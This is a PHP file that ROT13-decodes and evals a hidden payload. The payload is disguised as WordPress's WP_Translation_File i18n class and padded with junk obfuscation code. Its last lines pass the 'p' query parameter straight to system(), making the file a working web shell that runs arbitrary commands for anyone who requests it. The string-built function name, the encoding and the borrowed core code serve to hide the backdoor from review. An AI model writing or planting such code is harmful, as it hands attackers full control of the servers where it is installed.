<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * V18A: JC_Genafyngvba_Svyr pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr V18A
 * @fvapr 6.5.0
 */

/**
 * Pynff JC_Genafyngvba_Svyr.
 *
 * @fvapr 6.5.0
 */
nofgenpg pynff JC_Genafyngvba_Svyr {
	/**
	 * Yvfg bs urnqref.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl<fgevat, fgevat>
	 */
	cebgrpgrq $urnqref = neenl();

	/**
	 * Jurgure svyr unf orra cnefrq.
	 *
	 * @fvapr 6.5.0
	 * @ine obby
	 */
	cebgrpgrq $cnefrq = snyfr;

	/**
	 * Reebe vasbezngvba.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat|ahyy Reebe zrffntr be ahyy vs ab reebe.
	 */
	cebgrpgrq $reebe;

	/**
	 * Svyr anzr.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat
	 */
	cebgrpgrq $svyr = '';

	/**
	 * Genafyngvba ragevrf.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl<fgevat, fgevat>
	 */
	cebgrpgrq $ragevrf = neenl();

	/**
	 * Cyheny sbezf shapgvba.
	 *
	 * @fvapr 6.5.0
	 * @ine pnyynoyr|ahyy Cyheny sbezf.
	 */
	cebgrpgrq $cyheny_sbezf = ahyy;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $svyr Svyr gb ybnq.
	 */
	cebgrpgrq shapgvba __pbafgehpg( fgevat $svyr ) {
		$guvf->svyr = $svyr;
	}

	/**
	 * Perngrf n arj JC_Genafyngvba_Svyr vafgnapr sbe n tvira svyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat      $svyr     Svyr anzr.
	 * @cnenz fgevat|ahyy $svyrglcr Bcgvbany. Svyr glcr. Qrsnhyg vasreerq sebz svyr anzr.
	 * @erghea snyfr|JC_Genafyngvba_Svyr
	 */
	choyvp fgngvp shapgvba perngr( fgevat $svyr, ?fgevat $svyrglcr = ahyy ) {
		vs ( ! vf_ernqnoyr( $svyr ) ) {
			erghea snyfr;
		}

		vs ( ahyy === $svyrglcr ) {
			$cbf = fgeecbf( $svyr, '.' );
			vs ( snyfr !== $cbf ) {
				$svyrglcr = fhofge( $svyr, $cbf + 1 );
			}
		}

		fjvgpu ( $svyrglcr ) {
			pnfr 'zb':
				erghea arj JC_Genafyngvba_Svyr_ZB( $svyr );
			pnfr 'cuc':
				erghea arj JC_Genafyngvba_Svyr_CUC( $svyr );
			qrsnhyg:
				erghea snyfr;
		}
	}

	/**
	 * Perngrf n arj JC_Genafyngvba_Svyr vafgnapr sbe n tvira svyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $svyr     Fbhepr svyr anzr.
	 * @cnenz fgevat $svyrglcr Qrfverq gnetrg svyr glcr.
	 * @erghea fgevat|snyfr Genafsbezrq genafyngvba svyr pbagragf ba fhpprff, snyfr bgurejvfr.
	 */
	choyvp fgngvp shapgvba genafsbez( fgevat $svyr, fgevat $svyrglcr ) {
		$fbhepr = frys::perngr( $svyr );

		vs ( snyfr === $fbhepr ) {
			erghea snyfr;
		}

		fjvgpu ( $svyrglcr ) {
			pnfr 'zb':
				$qrfgvangvba = arj JC_Genafyngvba_Svyr_ZB( '' );
				oernx;
			pnfr 'cuc':
				$qrfgvangvba = arj JC_Genafyngvba_Svyr_CUC( '' );
				oernx;
			qrsnhyg:
				erghea snyfr;
		}

		$fhpprff = $qrfgvangvba->vzcbeg( $fbhepr );

		vs ( ! $fhpprff ) {
			erghea snyfr;
		}

		erghea $qrfgvangvba->rkcbeg();
	}

	/**
	 * Ergheaf nyy urnqref.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl<fgevat, fgevat> Urnqref.
	 */
	choyvp shapgvba urnqref(): neenl {
		vs ( ! $guvf->cnefrq ) {
			$guvf->cnefr_svyr();
		}
		erghea $guvf->urnqref;
	}

	/**
	 * Ergheaf nyy ragevrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl<fgevat, fgevat[]> Ragevrf.
	 */
	choyvp shapgvba ragevrf(): neenl {
		vs ( ! $guvf->cnefrq ) {
			$guvf->cnefr_svyr();
		}

		erghea $guvf->ragevrf;
	}

	/**
	 * Ergheaf gur pheerag reebe vasbezngvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat|ahyy Reebe zrffntr be ahyy vs ab reebe.
	 */
	choyvp shapgvba reebe() {
		erghea $guvf->reebe;
	}

	/**
	 * Ergheaf gur svyr anzr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat Svyr anzr.
	 */
	choyvp shapgvba trg_svyr(): fgevat {
		erghea $guvf->svyr;
	}

	/**
	 * Genafyngrf n tvira fgevat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $grkg Fgevat gb genafyngr.
	 * @erghea snyfr|fgevat Genafyngvba(f) ba fhpprff, snyfr bgurejvfr.
	 */
	choyvp shapgvba genafyngr( fgevat $grkg ) {
		vs ( ! $guvf->cnefrq ) {
			$guvf->cnefr_svyr();
		}

		erghea $guvf->ragevrf[ $grkg ] ?? snyfr;
	}

	/**
	 * Ergheaf gur cyheny sbez sbe n tvira ahzore.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz vag $ahzore Pbhag.
	 * @erghea vag Cyheny sbez.
	 */
	choyvp shapgvba trg_cyheny_sbez( vag $ahzore ): vag {
		vs ( ! $guvf->cnefrq ) {
			$guvf->cnefr_svyr();
		}

		vs ( ahyy === $guvf->cyheny_sbezf && vffrg( $guvf->urnqref['cyheny-sbezf'] ) ) {
			$rkcerffvba         = $guvf->trg_cyheny_rkcerffvba_sebz_urnqre( $guvf->urnqref['cyheny-sbezf'] );
			$guvf->cyheny_sbezf = $guvf->znxr_cyheny_sbez_shapgvba( $rkcerffvba );
		}

		vs ( vf_pnyynoyr( $guvf->cyheny_sbezf ) ) {
			/**
			 * Cyheny sbez.
			 *
			 * @ine vag $erfhyg Cyheny sbez.
			 */
			$erfhyg = pnyy_hfre_shap( $guvf->cyheny_sbezf, $ahzore );

			erghea $erfhyg;
		}

		// Qrsnhyg cyheny sbez zngpurf Ratyvfu, bayl \"Bar\" vf pbafvqrerq fvathyne.
		erghea ( 1 === $ahzore ? 0 : 1 );
	}

	/**
	 * Ergheaf gur cyheny sbezf rkcerffvba nf n ghcyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $urnqre Cyheny-Sbezf urnqre fgevat.
	 * @erghea fgevat Cyheny sbezf rkcerffvba.
	 */
	cebgrpgrq shapgvba trg_cyheny_rkcerffvba_sebz_urnqre( fgevat $urnqre ): fgevat {
		vs ( cert_zngpu( '/^\f*acyhenyf\f*=\f*(\q+)\f*;\f+cyheny\f*=\f*(.+)$/', $urnqre, $zngpurf ) ) {
			erghea gevz( $zngpurf[2] );
		}

		erghea 'a != 1';
	}

	/**
	 * Znxrf n shapgvba, juvpu jvyy erghea gur evtug genafyngvba vaqrk, nppbeqvat gb gur
	 * cyheny sbezf urnqre.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $rkcerffvba Cyheny sbez rkcerffvba.
	 * @erghea pnyynoyr(vag $ahz): vag Cyheny sbezf shapgvba.
	 */
	cebgrpgrq shapgvba znxr_cyheny_sbez_shapgvba( fgevat $rkcerffvba ): pnyynoyr {
		gel {
			$unaqyre = arj Cyheny_Sbezf( egevz( $rkcerffvba, ';' ) );
			erghea neenl( $unaqyre, 'trg' );
		} pngpu ( Rkprcgvba $r ) {
			// Snyy onpx gb qrsnhyg cyheny-sbez shapgvba.
			erghea $guvf->znxr_cyheny_sbez_shapgvba( 'a != 1' );
		}
	}

	/**
	 * Vzcbegf genafyngvbaf sebz nabgure svyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Genafyngvba_Svyr $fbhepr Fbhepr svyr.
	 * @erghea obby Gehr ba fhpprff, snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba vzcbeg( JC_Genafyngvba_Svyr $fbhepr ): obby {
		vs ( ahyy !== $fbhepr->reebe() ) {
			erghea snyfr;
		}

		$guvf->urnqref = $fbhepr->urnqref();
		$guvf->ragevrf = $fbhepr->ragevrf();
		$guvf->reebe   = $fbhepr->reebe();

		erghea ahyy === $guvf->reebe;
	}

	/**
	 * Cnefrf gur svyr.
	 *
	 * @fvapr 6.5.0
	 */
	nofgenpg cebgrpgrq shapgvba cnefr_svyr();

	/**
	 * Rkcbegf genafyngvba pbagragf nf n fgevat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat Genafyngvba svyr pbagragf.
	 */
	nofgenpg choyvp shapgvba rkcbeg();
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>